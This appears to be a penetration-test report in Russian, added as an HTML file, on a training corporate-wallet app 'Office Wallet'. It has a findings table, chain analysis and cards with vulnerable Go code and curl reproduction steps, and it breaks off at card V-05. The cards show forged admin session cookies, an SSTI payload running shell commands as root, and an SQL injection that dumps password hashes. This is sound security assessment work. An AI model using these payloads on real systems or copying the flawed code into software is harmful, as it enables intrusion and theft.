@@ -1,0 +1,838 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<title>Office Wallet — отчёт по безопасности</title>
+<style>
+  @page { size: A4; margin: 16mm 14mm; }
+  * { box-sizing: border-box; }
+  body { font-family: "Segoe UI", Arial, sans-serif; color: #15181f; font-size: 10.5pt; line-height: 1.45; margin: 0; }
+  h1 { font-size: 22pt; margin: 0 0 4pt; }
+  h2 { font-size: 15pt; margin: 18pt 0 6pt; border-bottom: 2px solid #1f6feb; padding-bottom: 3pt; }
+  h3 { font-size: 12.5pt; margin: 2pt 0 4pt; }
+  a { color: #1f6feb; text-decoration: none; }
+  code, pre { font-family: Consolas, "Courier New", "DejaVu Sans Mono", monospace; font-size: 8.6pt;
+    font-variant-ligatures: none; font-feature-settings: "liga" 0, "calt" 0; -webkit-font-feature-settings: "liga" 0, "calt" 0; }
+  pre { background: #0f1116; color: #e6edf3; padding: 8px 10px; border-radius: 6px; overflow-x: auto; white-space: pre-wrap; word-break: break-word; }
+  pre.sh { background: #10220f; }
+  .muted { color: #5b6472; }
+  table { border-collapse: collapse; width: 100%; margin: 6pt 0; }
+  th, td { border: 1px solid #ccd2db; padding: 4px 7px; text-align: left; vertical-align: top; font-size: 9pt; }
+  th { background: #eef2f8; }
+  .sev { font-weight: 700; padding: 1px 6px; border-radius: 4px; color: #fff; font-size: 8.5pt; white-space: nowrap; }
+  .crit { background: #9b1c1c; }
+  .high { background: #c2410c; }
+  .med  { background: #a16207; }
+  .low  { background: #2563eb; }
+  .card { border: 1px solid #d5dbe4; border-radius: 8px; padding: 10px 12px; margin: 10pt 0; page-break-inside: avoid; }
+  .card h3 { display: flex; justify-content: space-between; gap: 8px; align-items: baseline; }
+  .meta { font-size: 8.6pt; color: #39414f; margin: 2pt 0 6pt; }
+  .field { margin: 5pt 0; }
+  .field b { color: #1f2a3a; }
+  .cover { padding: 30mm 0 10mm; }
+  .cover .sub { font-size: 12pt; color: #39414f; margin-top: 10pt; }
+  .pill { display: inline-block; background: #eef2f8; border: 1px solid #ccd2db; border-radius: 20px; padding: 2px 10px; margin: 2px 4px 2px 0; font-size: 8.6pt; }
+  .chain { display: flex; flex-wrap: wrap; gap: 6px; align-items: center; margin: 6pt 0; }
+  .node { background: #eef2f8; border: 1px solid #b9c2d0; border-radius: 6px; padding: 4px 8px; font-size: 8.6pt; }
+  .arrow { color: #1f6feb; font-weight: 700; }
+  .pagebreak { page-break-before: always; }
+  .small { font-size: 8.4pt; }
+  ul { margin: 4pt 0; padding-left: 18px; }
+  .ok { color: #15803d; font-weight: 600; }
+</style>
+</head>
+<body>
+
+<section class="cover">
+  <h1>Анализ безопасности «Office Wallet»</h1>
+  <div class="sub">
+    Корпоративный кошелёк (Go + PostgreSQL + Mailpit + notify-mock)<br>
+    Команда: <b>TUZteam</b> · Дата: 26 ноября 2026<br>
+    Объект: локальный стенд <code>docker compose</code> (<code>http://localhost:18081</code>), образ <code>work-app:latest</code>; боевой контур — <code>*.devsecops-contest.ru</code><br>
+    Режим: белый ящик (исходники + образ), подтверждение по сети приложения.
+  </div>
+  <p class="meta" style="margin-top:18pt">
+    Отчёт — объединение двух копий репозитория. Карточки <b>V-01…V-28</b> — прогон
+    <code>poc/kept/</code> (<b>17/17</b>, <code>artifacts/poc-run.txt</code>). Карточки
+    <b>V-29…V-40</b> — цепочки из <code>poc/</code>
+    (<code>stage_access.py</code>, <code>stage_money.py</code>, <code>stage_data.py</code>,
+    <code>stage_xss.py</code>, <code>stage_registry_extra.py</code>), которых в первом отчёте не было.
+    Реестр <code>OW-01…OW-44</code> сведён с V-карточками в таблице ниже. Для каждой находки приведены
+    суть, код, класс OWASP/CWE, предусловия, шаг воспроизведения, результат, цепочка и рекомендация.
+    Источник классов — OWASP Top-10 / CWE и
+    <a href="https://www.hacksplaining.com">hacksplaining.com</a>.
+  </p>
+</section>
+
+<h2>Окружение и метод</h2>
+<p>Стенд собран из репозитория: <code>docker compose up -d --build</code>. Приложение (образ <code>work-app</code>,
+база <code>debian:bookworm-slim</code>) слушает <code>:8080</code>, опубликовано на <code>18081</code>; PostgreSQL 16,
+Mailpit и notify-mock — отдельные сервисы. Учётки сида: <code>ivanov/workplace1</code> (сотрудник), а также
+<code>kassa</code> (кассир), <code>buch</code> (бухгалтер), <code>adminw</code> (администратор).</p>
+<p>PoC написаны под cookie-сессии приложения (новый клиент <code>poc/kept/wallet_client.py</code>; прошлый
+<code>KeptExpliots/_http.py</code> рассчитан на Token-API другого стенда и не подходит). Прогон:
+<code>docker run --rm --network work_default -v &lt;poc&gt;:/poc -w /poc python:3-alpine python run_all.py --base http://app:8080</code>.
+Сканеры: Trivy 0.76.2 (образ + репозиторий), Nuclei 3.11.1 (стенд), заголовки — curl.</p>
+
+<h2>Сводка находок</h2>
+<table>
+  <thead><tr><th>ID</th><th>Критичность</th><th>CVSS</th><th>Находка</th><th>Класс</th><th>PoC</th></tr></thead>
+  <tbody>
+    <tr><td>V-01</td><td><span class="sev crit">Critical</span></td><td>9.8</td><td>Ключи подписи захардкожены и утекают в статике</td><td>A02/A05, CWE-798/CWE-321</td><td>01</td></tr>
+    <tr><td>V-02</td><td><span class="sev crit">Critical</span></td><td>9.8</td><td>Роль берётся из подписанной куки → подделка admin</td><td>A01/A04, CWE-807/CWE-290</td><td>02,03</td></tr>
+    <tr><td>V-03</td><td><span class="sev crit">Critical</span></td><td>9.9</td><td>SSTI в превью чека → RCE под root</td><td>A03, CWE-1336/CWE-94/CWE-78</td><td>06</td></tr>
+    <tr><td>V-04</td><td><span class="sev crit">Critical</span></td><td>9.1</td><td>SQL-инъекция в сумме перевода (error-based)</td><td>A03, CWE-89</td><td>04</td></tr>
+    <tr><td>V-05</td><td><span class="sev high">High</span></td><td>8.8</td><td>SQL-инъекция (UNION) в сверке бухгалтера</td><td>A03, CWE-89</td><td>05</td></tr>
+    <tr><td>V-06</td><td><span class="sev high">High</span></td><td>7.7</td><td>Path traversal → чтение произвольных файлов</td><td>A01, CWE-22</td><td>07</td></tr>
+    <tr><td>V-07</td><td><span class="sev high">High</span></td><td>8.1</td><td>Инфляция возврата заказа (refund = total×qty)</td><td>A04, CWE-840/CWE-20</td><td>08</td></tr>
+    <tr><td>V-08</td><td><span class="sev high">High</span></td><td>8.1</td><td>Захват аккаунта через слабый сброс пароля</td><td>A07, CWE-640/CWE-307/CWE-330</td><td>15</td></tr>
+    <tr><td>V-09</td><td><span class="sev high">High</span></td><td>8.1</td><td>Подделка платёжной подписи и переигровка</td><td>A02/A08, CWE-347/CWE-294</td><td>12</td></tr>
+    <tr><td>V-10</td><td><span class="sev med">Medium</span></td><td>6.5</td><td>IDOR: просмотр чужого заказа</td><td>A01, CWE-639</td><td>09</td></tr>
+    <tr><td>V-11</td><td><span class="sev med">Medium</span></td><td>6.5</td><td>IDOR: глобальная лента + предсказуемый grant</td><td>A01, CWE-639/CWE-340</td><td>10</td></tr>
+    <tr><td>V-12</td><td><span class="sev med">Medium</span></td><td>5.3</td><td>Утечка себестоимости/поставщиков (supply-channel)</td><td>A01/A04, CWE-200/CWE-922</td><td>11</td></tr>
+    <tr><td>V-13</td><td><span class="sev high">High</span></td><td>7.1</td><td>Хранимая XSS в чаевых</td><td>A03, CWE-79</td><td>14</td></tr>
+    <tr><td>V-14</td><td><span class="sev med">Medium</span></td><td>6.1</td><td>Отражённая XSS в истории</td><td>A03, CWE-79</td><td>13</td></tr>
+    <tr><td>V-15</td><td><span class="sev med">Medium</span></td><td>5.4</td><td>Cookie сессии без HttpOnly/Secure</td><td>A05, CWE-1004/CWE-614</td><td>01,13,14</td></tr>
+    <tr><td>V-16</td><td><span class="sev med">Medium</span></td><td>6.5</td><td>TOCTOU в оформлении → недоплата</td><td>A04, CWE-367</td><td>—</td></tr>
+    <tr><td>V-17</td><td><span class="sev med">Medium</span></td><td>6.5</td><td>Двойной возврат при выдаче кассиром</td><td>A04, CWE-840</td><td>—</td></tr>
+    <tr><td>V-18</td><td><span class="sev high">High</span></td><td>7.4</td><td>БД без TLS + пароль в коде/чарте</td><td>A02/A05, CWE-319/CWE-798</td><td>—</td></tr>
+    <tr><td>V-19</td><td><span class="sev med">Medium</span></td><td>6.0</td><td>Контейнер под root + уязвимая база образа</td><td>A05, CWE-250/CWE-1395</td><td>06,trivy</td></tr>
+    <tr><td>V-20</td><td><span class="sev med">Medium</span></td><td>5.3</td><td>SSRF к mock + фиксированная команда + журнал без роли</td><td>A10, CWE-918/CWE-78</td><td>—</td></tr>
+    <tr><td>V-21</td><td><span class="sev med">Medium</span></td><td>5.3</td><td>Нет таймаутов сервера и лимита пула → DoS</td><td>A05, CWE-400/CWE-770</td><td>—</td></tr>
+    <tr><td>V-22</td><td><span class="sev low">Low</span></td><td>4.3</td><td>Нет security-заголовков (CSP/XFO/HSTS) → clickjacking</td><td>A05, CWE-1021/CWE-693</td><td>curl</td></tr>
+    <tr><td>V-23</td><td><span class="sev med">Medium</span></td><td>6.5</td><td>Нет CSRF-защиты; смена состояния по GET</td><td>A01, CWE-352</td><td>—</td></tr>
+    <tr><td>V-24</td><td><span class="sev low">Low</span></td><td>4.3</td><td>Раскрытие ошибок СУБД и SQL пользователю</td><td>A05, CWE-209</td><td>17</td></tr>
+    <tr><td>V-25</td><td><span class="sev low">Low</span></td><td>4.3</td><td>Перечисление пользователей</td><td>A01, CWE-200/CWE-307</td><td>16</td></tr>
+    <tr><td>V-26</td><td><span class="sev med">Medium</span></td><td>6.5</td><td>Секреты печатаются в логи CI</td><td>A09, CWE-532</td><td>—</td></tr>
+    <tr><td>V-27</td><td><span class="sev med">Medium</span></td><td>6.5</td><td>K8s без securityContext; публичный Mailpit</td><td>A05, CWE-16/CWE-306</td><td>trivy</td></tr>
+    <tr><td>V-28</td><td><span class="sev med">Medium</span></td><td>—</td><td>Уязвимые зависимости (Go stdlib, пакеты ОС)</td><td>A06, CWE-1104/CWE-1395</td><td>trivy</td></tr>
+    <tr><td>V-29</td><td><span class="sev high">High</span></td><td>7.5</td><td>Переполнение чаевых на кассе → заказ за 0</td><td>A04, CWE-190</td><td>main stage_money</td></tr>
+    <tr><td>V-30</td><td><span class="sev med">Medium</span></td><td>6.5</td><td>Гонка: одна котировка оформляется несколько раз</td><td>A04, CWE-362</td><td>main stage_registry_extra</td></tr>
+    <tr><td>V-31</td><td><span class="sev med">Medium</span></td><td>6.5</td><td>Гонка возврата: несколько зачислений до смены статуса</td><td>A04, CWE-362</td><td>main stage_registry_extra</td></tr>
+    <tr><td>V-32</td><td><span class="sev low">Low</span></td><td>4.3</td><td>Ложный успех корзины и продажа неактивного товара</td><td>A04, CWE-252</td><td>main stage_money</td></tr>
+    <tr><td>V-33</td><td><span class="sev med">Medium</span></td><td>6.5</td><td>Гонка чаевых: две отправки проходят одну проверку баланса</td><td>A04, CWE-362</td><td>main stage_registry_extra</td></tr>
+    <tr><td>V-34</td><td><span class="sev high">High</span></td><td>7.1</td><td>Отрицательное кассовое пополнение списывает баланс</td><td>A04, CWE-20</td><td>main stage_money</td></tr>
+    <tr><td>V-35</td><td><span class="sev med">Medium</span></td><td>5.3</td><td>Корректировка бухгалтера без транзакции</td><td>A04, CWE-362</td><td>main stage_registry_extra</td></tr>
+    <tr><td>V-36</td><td><span class="sev med">Medium</span></td><td>5.3</td><td>Вход без ограничения попыток</td><td>A07, CWE-307</td><td>main stage_access</td></tr>
+    <tr><td>V-37</td><td><span class="sev med">Medium</span></td><td>6.5</td><td>Флаг blocked не мешает входу и сессии</td><td>A07, CWE-285</td><td>main stage_access</td></tr>
+    <tr><td>V-38</td><td><span class="sev high">High</span></td><td>7.1</td><td>Выход не отзывает сессию, срока у куки нет</td><td>A07, CWE-613</td><td>main stage_access</td></tr>
+    <tr><td>V-39</td><td><span class="sev low">Low</span></td><td>4.3</td><td>op_type из формы подменяет вид перевода</td><td>A04, CWE-345</td><td>main stage_registry_extra</td></tr>
+    <tr><td>V-40</td><td><span class="sev low">Low</span></td><td>4.3</td><td>Ошибка bcrypt при регистрации игнорируется</td><td>A07, CWE-252</td><td>main stage_access</td></tr>
+  </tbody>
+</table>
+
+<h3>Сводка двух веток</h3>
+<table>
+  <thead><tr><th>Реестр</th><th>Карточка</th><th>Где PoC</th></tr></thead>
+  <tbody>
+    <tr><td>OW-35</td><td>V-01</td><td><code>poc/kept/01_key_leak_static_js.py</code>; main <code>01_forged_session_and_payment.py</code>, <code>stage_registry_extra.py</code></td></tr>
+    <tr><td>OW-28</td><td>V-02, V-37</td><td><code>poc/kept/02_session_forge_admin.py</code>, <code>03_role_forge_money.py</code>; main <code>stage_access.py</code> (обход <code>blocked</code>)</td></tr>
+    <tr><td>OW-08</td><td>V-03</td><td><code>poc/kept/06_ssti_rce.py</code>; main <code>stage_data.py</code></td></tr>
+    <tr><td>OW-14</td><td>V-04</td><td><code>poc/kept/04_sqli_transfer_errorbased.py</code>; main <code>stage_money.py</code>, <code>stage_data.py</code></td></tr>
+    <tr><td>OW-21</td><td>V-05</td><td><code>poc/kept/05_sqli_reconcile_union.py</code>; main <code>stage_money.py</code></td></tr>
+    <tr><td>OW-09</td><td>V-06</td><td><code>poc/kept/07_path_traversal.py</code>; main <code>stage_data.py</code></td></tr>
+    <tr><td>OW-05</td><td>V-07</td><td><code>poc/kept/08_order_return_inflation.py</code>; main <code>stage_money.py</code> (qty&gt;1 и qty&lt;0)</td></tr>
+    <tr><td>OW-26</td><td>V-08</td><td><code>poc/kept/15_password_reset_ato.py</code>; main <code>stage_access.py</code></td></tr>
+    <tr><td>OW-17</td><td>V-09</td><td><code>poc/kept/12_payment_replay_forge.py</code>; main <code>01_forged_session_and_payment.py</code>, <code>stage_money.py</code></td></tr>
+    <tr><td>OW-13</td><td>V-11</td><td><code>poc/kept/10_idor_ops_feed.py</code>; main <code>stage_data.py</code></td></tr>
+    <tr><td>OW-10, OW-39</td><td>V-12</td><td><code>poc/kept/11_supply_pricing_leak.py</code>; main <code>stage_registry_extra.py</code></td></tr>
+    <tr><td>OW-12</td><td>V-13, V-14</td><td><code>poc/kept/13_</code>, <code>14_</code>; main <code>stage_xss.py</code></td></tr>
+    <tr><td>OW-30</td><td>V-15</td><td>заголовки входа; main <code>stage_xss.py</code></td></tr>
+    <tr><td>OW-02</td><td>V-16</td><td>main <code>stage_money.py</code></td></tr>
+    <tr><td>OW-20</td><td>V-17</td><td>main <code>stage_registry_extra.py</code></td></tr>
+    <tr><td>OW-34</td><td>V-18</td><td>main <code>02_default_db_creds.py</code>, <code>stage_access.py</code>, <code>stage_data.py</code></td></tr>
+    <tr><td>OW-42</td><td>V-19</td><td>Trivy; main <code>stage_registry_extra.py</code></td></tr>
+    <tr><td>OW-18, OW-37, OW-38</td><td>V-20</td><td>main <code>stage_registry_extra.py</code></td></tr>
+    <tr><td>OW-32, OW-33</td><td>V-21</td><td>main <code>04_unlimited_db_pool.py</code>, <code>03_slowloris.py</code></td></tr>
+    <tr><td>OW-41</td><td>V-22</td><td>curl; main <code>stage_registry_extra.py</code></td></tr>
+    <tr><td>OW-07, OW-40</td><td>V-23</td><td>main <code>stage_money.py</code>, <code>stage_registry_extra.py</code></td></tr>
+    <tr><td>OW-43</td><td>V-24</td><td><code>poc/kept/17_info_disclosure_errors.py</code>; main <code>stage_registry_extra.py</code></td></tr>
+    <tr><td>OW-36</td><td>V-26</td><td>main <code>stage_registry_extra.py</code></td></tr>
+    <tr><td>OW-01</td><td>V-29</td><td>main <code>stage_money.py</code></td></tr>
+    <tr><td>OW-03</td><td>V-30</td><td>main <code>stage_registry_extra.py</code></td></tr>
+    <tr><td>OW-06</td><td>V-31</td><td>main <code>stage_registry_extra.py</code></td></tr>
+    <tr><td>OW-11</td><td>V-32</td><td>main <code>stage_money.py</code></td></tr>
+    <tr><td>OW-16</td><td>V-33</td><td>main <code>stage_registry_extra.py</code></td></tr>
+    <tr><td>OW-19</td><td>V-34</td><td>main <code>stage_money.py</code></td></tr>
+    <tr><td>OW-22</td><td>V-35</td><td>main <code>stage_registry_extra.py</code></td></tr>
+    <tr><td>OW-23</td><td>V-36</td><td>main <code>stage_access.py</code></td></tr>
+    <tr><td>OW-29</td><td>V-38</td><td>main <code>stage_access.py</code></td></tr>
+    <tr><td>OW-44</td><td>V-39</td><td>main <code>stage_registry_extra.py</code></td></tr>
+    <tr><td>OW-24</td><td>V-40</td><td>main <code>stage_access.py</code></td></tr>
+    <tr><td>—</td><td>V-25, V-27, V-28</td><td>только отчёт Kept (перечисление, Mailpit/K8s, SCA)</td></tr>
+  </tbody>
+</table>
+<p class="small muted">Скрипты в <code>poc/</code> есть, отдельной открытой карточки нет: <b>OW-04</b> (отмена чужого заказа — в текущем <code>orderCancel</code> обеих копий стоит проверка владельца), <b>OW-15</b> (параллельное подтверждение перевода — черновик снимается внутри транзакции), <b>OW-25</b> (запасной SMS-код только при отказе <code>crypto/rand</code>), <b>OW-27</b> (ящик <code>/mail</code> отдаёт чужие письма только роли admin), <b>OW-31</b> (переполнение рублей — <code>parseRubToKop</code> отдаёт ошибку <code>ParseInt</code>, черновик не создаётся).</p>
+
+<h3>Что чинить первым</h3>
+<ul>
+  <li><b>Деньги своей сессии</b> — V-07 (возврат <code>total×qty</code>), V-16 (оплата по старой котировке), V-29 (заказ за 0), V-30/V-31 (гонки). Это отдельные дыры, они не складываются в одну стрелку.</li>
+  <li><b>Чужие деньги</b> — V-13/V-14: XSS на том же сайте действует с кукой жертвы и дотягивается до V-09 (подпись повторного платежа уже лежит в её истории). V-34 и V-17 требуют роль кассира из таблицы <code>users</code>.</li>
+  <li><b>Чужие операции и закупочные цены</b> — V-11 и V-12. Канал поставки отдаёт сам каталог, ключ сессии для этого не нужен.</li>
+  <li><b>Сессия</b> — V-37 (<code>blocked</code> не проверяется) и V-38 (выход не отзывает куку). Это не продолжение доступа к базе.</li>
+  <li><b>База</b> — V-18: пароль <code>wallet/wallet</code> из compose, если Postgres доступен в сети стенда. Дальше приложение уже не нужно.</li>
+</ul>
+
+<h3>Цепочки, которые сходятся на текущем коде Kept</h3>
+<p class="small">Проверено по <code>app/</code> этого дерева. Роль везде берётся из <code>users</code>, не из поля куки.</p>
+<div class="chain">
+  <span class="node">V-13/V-14 XSS на том же сайте</span><span class="arrow">→</span>
+  <span class="node">запрос с кукой жертвы</span><span class="arrow">→</span>
+  <span class="node">V-09 повтор платежа из её истории</span>
+</div>
+<div class="chain">
+  <span class="node">V-13/V-14 XSS</span><span class="arrow">→</span>
+  <span class="node">V-11 лента и op_grant без HttpOnly</span><span class="arrow">→</span>
+  <span class="node">чужие операции</span>
+</div>
+<div class="chain">
+  <span class="node">V-12 каталог отдаёт канал</span><span class="arrow">→</span>
+  <span class="node">себестоимость и поставщики</span>
+</div>
+<div class="chain">
+  <span class="node">V-16 старая котировка</span><span class="arrow">или</span>
+  <span class="node">V-07 возврат qty×total</span><span class="arrow">или</span>
+  <span class="node">V-29 заказ за 0</span><span class="arrow">или</span>
+  <span class="node">V-30/V-31 гонка</span>
+</div>
+<div class="chain">
+  <span class="node">роль cashier в БД</span><span class="arrow">→</span>
+  <span class="node">V-34 отрицательное пополнение</span><span class="arrow">/</span>
+  <span class="node">V-17 повторный возврат на выдаче</span>
+</div>
+
+<h3>Что в карту не входит</h3>
+<p>Ниже звенья из первого текста отчёта и из <code>CHAINS.md</code> / <code>poc/</code>. На текущем коде стрелка не проводится.</p>
+<ul>
+  <li><b>V-01 → V-02 → V-08.</b> Статика собирает строку <code>office-wallet-session-key</code>, а <code>server.go</code> с таким ключом не стартует. <code>currentUser</code> после проверки подписи загружает пользователя из БД и поле роли в куке не применяет. <code>/gateway/sms</code> открыт только <code>IsAdmin()</code>. Письмо сброса код не содержит.</li>
+  <li><b>V-02 → V-05 / V-03 → V-19.</b> Сверка параметризована, превью чека экранируется. <code>exec.Command</code> запускает фиксированное <code>uname -a</code>, не строку атакующего. В <code>main</code> эта стрелка была записана как RCE через уведомления.</li>
+  <li><b>V-01 → V-09 и V-04 → хэши.</b> Подпись повтора уже стоит в истории самого пользователя (<code>ReplaySig</code>). Сумма перевода разбирается <code>parseRubToKop</code>, в SQL не подставляется.</li>
+  <li><b>XSS → кража <code>ow_session</code> → эскалация.</b> У <code>ow_session</code> стоит <code>HttpOnly: true</code>. Без HttpOnly остаётся только <code>op_grant_*</code>. Эскалации роли это не даёт.</li>
+  <li><b>V-29 → V-07.</b> Добавлено из <code>poc/stage_money.py</code>. У заказа за 0 <code>total_kop = 0</code>, возврат <code>0 × qty</code> денег не печатает.</li>
+  <li><b>V-18 → V-37 → V-38 и V-36 → V-08 → V-23 → V-33/V-39.</b> Добавлено по мотивам <code>main/CHAINS.md</code>. Запись в базу уже полный доступ, обход <code>blocked</code> ей не нужен. Брут логина не ведёт к сбросу пароля. Кука <code>SameSite=Lax</code>, чужой сайт POST-запросом чаевые и <code>op_type</code> не отправит. <code>V-39</code> меняет только вид проводки.</li>
+  <li><b>Из <code>poc/</code> отдельно:</b> отмена чужого заказа (владелец проверяется), общий ящик почты (только admin), переполнение рублей в копейки (<code>ParseInt</code> возвращает ошибку), двойное подтверждение перевода (черновик снимается в транзакции).</li>
+</ul>
+
+<div class="pagebreak"></div>
+<h2>Карточки находок</h2>
+<p class="small muted">Файлы: <code>app/internal/app/</code>. В curl-примерах используется подделанная кука на дефолтном
+<code>SESSION_KEY=office-wallet-session-key</code>; на боевом ключе значение иное, но способ тот же.</p>
+
+<!-- V-01 -->
+<div class="card">
+  <h3>V-01. Ключи подписи захардкожены и утекают в клиентскую статику <span class="sev crit">Critical · CVSS 9.8</span></h3>
+  <div class="meta">A02:2021 / A05:2021 · CWE-798, CWE-321, CWE-547 · PoC: <code>poc/kept/01_key_leak_static_js.py</code></div>
+  <div class="field"><b>Суть.</b> <code>SESSION_KEY</code> и <code>PAYMENT_KEY</code> имеют дефолтные значения, прошитые в коде и compose, и вдобавок по частям собираются в статике, отдаваемой каждому браузеру. Любой анонимный клиент восстанавливает оба ключа.</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// app/cmd/wallet/main.go
+SessionKey: env("SESSION_KEY", "office-wallet-session-key"),
+PaymentKey: env("PAYMENT_KEY", "office-wallet-pay-key"),
+
+// app/static/pay.js        -> "office-wallet-pay-key"
+// app/static/wallet.js + legacy-sync.js -> "office-wallet" + "-session-key"</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Нет (анонимно); либо доступ к исходникам/образу.</div>
+  <div class="field"><b>Шаги.</b>
+<pre class="sh"><code>curl -s http://localhost:18081/static/pay.js
+curl -s http://localhost:18081/static/wallet.js
+curl -s http://localhost:18081/static/legacy-sync.js
+# PAYMENT_KEY = office-wallet-pay-key ; SESSION_KEY = office-wallet-session-key</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">Оба ключа восстановлены</span> и приняты сервером (подделанная admin-кука = 200). Все HMAC-механизмы (сессия, платёж, op-grant, supply-channel) скомпрометированы.</div>
+  <div class="field"><b>Цепочки.</b> На текущем коде не корень. Сервер отвергает дефолтный ключ из статики. V-11 и V-12 живут без него: лента и канал отдаются залогиненному пользователю.</div>
+  <div class="field"><b>Фикс.</b> Падать на старте при пустом/дефолтном/коротком ключе; удалить ключи из статики; op-grant и supply-channel не отдавать наружу. См. <code>fixes/PATCHES.md</code> (V-01).</div>
+</div>
+
+<!-- V-02 -->
+<div class="card">
+  <h3>V-02. Роль берётся из подписанной куки → подделка любой роли <span class="sev crit">Critical · CVSS 9.8</span></h3>
+  <div class="meta">A01:2021 / A04:2021 · CWE-807, CWE-290, CWE-302 · PoC: <code>poc/kept/02_session_forge_admin.py</code>, <code>poc/kept/03_role_forge_money.py</code></div>
+  <div class="field"><b>Суть.</b> Кука имеет вид <code>ow.&lt;uid&gt;.&lt;role&gt;.&lt;hmac&gt;</code>. Роль лежит внутри подписанного значения и после проверки подписи применяется как есть. С известным ключом (V-01) подписывается сессия с любой ролью.</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// app/internal/app/auth.go — currentUser()
+role := parts[2]
+expect := s.signSession(uid, role)
+if !hmac.Equal([]byte(sig), []byte(expect)) { return nil }
+...
+if role != "" { u.Role = role }   // роль из куки, не из БД</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Знание <code>SESSION_KEY</code> (из V-01) и существующего uid.</div>
+  <div class="field"><b>Шаги.</b>
+<pre class="sh"><code># admin (uid 6):
+curl -s -b "ow_session=ow.6.admin.c59d80997f788119de7c0e2848ac455a9c10b39f16a05706c3b16e6ce6ac23a1" \
+     http://localhost:18081/admin/secrets -o /dev/null -w "%{http_code}\n"   # 200
+
+# бухгалтер (uid 5) — начисление денег:
+curl -s -b "ow_session=ow.5.accountant.de1e7f93182cca1776b93f832b532a53510d4d891e95a3a42f4ff6cf2abafb74" \
+     -d "login=ivanov&delta_rub=1000000&reason=poc" http://localhost:18081/accounting/adjust</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">Открыт <code>/admin/secrets</code>, <code>/gateway/sms</code></span>; баланс ivanov вырос со 150,00 ₽ до 1 000 150,00 ₽ без прав.</div>
+  <div class="field"><b>Цепочки.</b> На текущем коде не даёт роль. Подпись куки проверяется, роль читается из <code>users</code>. Подделка поля <code>admin</code> у чужого id не открывает V-03, V-05, V-08 и V-17.</div>
+  <div class="field"><b>Фикс.</b> Роль только из <code>users</code>, подпись считать от uid без роли, кука <code>HttpOnly+Secure+SameSite=Strict</code> (V-02 в PATCHES).</div>
+</div>
+
+<!-- V-03 -->
+<div class="card">
+  <h3>V-03. SSTI в превью чека → удалённое выполнение кода под root <span class="sev crit">Critical · CVSS 9.9</span></h3>
+  <div class="meta">A03:2021 · CWE-1336, CWE-94, CWE-78 · PoC: <code>poc/kept/06_ssti_rce.py</code></div>
+  <div class="field"><b>Суть.</b> <code>orderPreview?renderer=classic</code> склеивает пользовательский <code>item_comment</code> в исходник <code>text/template</code>, у которого зарегистрирована функция <code>exec</code>, запускающая <code>sh -c</code>. Комментарий задаётся при оформлении заказа.</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// app/internal/app/handlers_shop.go — orderPreview()
+tplSrc = "Чек: " + comment + "\nСумма {{.Total}}\n"      // comment от пользователя
+t, _ := texttemplate.New("preview").Funcs(texttemplate.FuncMap{
+    "exec": func(cmd string) string {
+        b, _ := exec.Command("sh", "-c", cmd).CombinedOutput(); ...
+    }}).Parse(tplSrc)</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Сессия с балансом на покупку (здесь кассир uid 4 через V-02).</div>
+  <div class="field"><b>Шаги.</b>
+<pre class="sh"><code>C='ow_session=ow.4.cashier.5b53b4b2dfd250e2a5af1ae5c8ccd99df50948e6b16574c2d4e37a398f194a9b'
+curl -s -b "$C" -d "product_id=1" http://localhost:18081/cart/add
+curl -s -b "$C" --data-urlencode 'item_comment={{exec "id; uname -a"}}' \
+     -d "promo_code=&tip_kop=0" http://localhost:18081/checkout/quote   # -> quote_id
+curl -s -b "$C" -d "quote_id=&lt;id&gt;" http://localhost:18081/checkout/confirm     # -> /orders/&lt;oid&gt;
+curl -s -b "$C" "http://localhost:18081/orders/&lt;oid&gt;/preview?renderer=classic"</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">Выполнение команд</span>: <code>uid=0(root) gid=0(root)</code> — контейнер работает под root (усиление V-19).</div>
+  <div class="field"><b>Цепочки.</b> В текущем <code>orderPreview</code> текст экранируется, команда из комментария не запускается. Фиксированный <code>uname -a</code> относится к V-20 и не даёт произвольный код.</div>
+  <div class="field"><b>Фикс.</b> Удалить <code>renderer=classic</code> и функцию <code>exec</code>; рендерить только <code>html/template</code> с данными (V-03 в PATCHES).</div>
+</div>
+
+<!-- V-04 -->
+<div class="card">
+  <h3>V-04. SQL-инъекция в сумме перевода (error-based) <span class="sev crit">Critical · CVSS 9.1</span></h3>
+  <div class="meta">A03:2021 · CWE-89 · PoC: <code>poc/kept/04_sqli_transfer_errorbased.py</code></div>
+  <div class="field"><b>Суть.</b> Если сумма не парсится как число, она подставляется в SQL строкой и исполняется; текст ошибки Postgres возвращается пользователю — классический error-based oracle.</div>
+  <div class="field"><b>Расположение.</b>
+<pre><code>// app/internal/app/handlers_money.go — transferNew()
+q := fmt.Sprintf("SELECT %s::bigint", amountStr)
+_, qerr := s.db.Exec(q)
+if qerr != nil { msg = qerr.Error() + " | " + q }   // утечка ошибки + запроса</code></pre></div>
+  <div class="field"><b>Предусловия.</b> Любая сессия (подойдёт <code>ivanov/workplace1</code>).</div>
+  <div class="field"><b>Шаги.</b>
+<pre class="sh"><code># логинимся, сохраняем куку, затем:
+curl -s -b cj.txt --data-urlencode \
+ "amount_rub=(SELECT string_agg(login||':'||password_hash,'; ') FROM users)" \
+ -d "recipient=ivanov&memo=x" http://localhost:18081/transfer/new</code></pre></div>
+  <div class="field"><b>Результат.</b> <span class="ok">Слиты логины и bcrypt-хэши всех пользователей</span> (и <code>version()</code>). Через приведение текста к <code>bigint</code> Postgres возвращает значение в сообщении об ошибке.</div>
+  <div class="field"><b>Цепочки.</b> В текущем <code>transferNew</code> сумма проходит через <code>parseRubToKop</code> и в текст SQL не попадает. Выгрузка хэшей этой стрелкой не подтверждается.</div>
+  <div class="field"><b>Фикс.</b> Парсить сумму в Go, не класть в SQL; общий текст ошибки (V-04/V-24 в PATCHES).</div>
+</div>
+
+<!-- V-05 -->
+<div class="card">
+  <h3>V-05. SQL-инъекция (UNION) в сверке бухгалтера <span class="sev high">High · CVSS 8.8</span></h3>
+  <div class="meta">A03:2021 · CWE-89 · PoC: <code>poc/kept/05_sqli_reconcile_union.py</code></div>
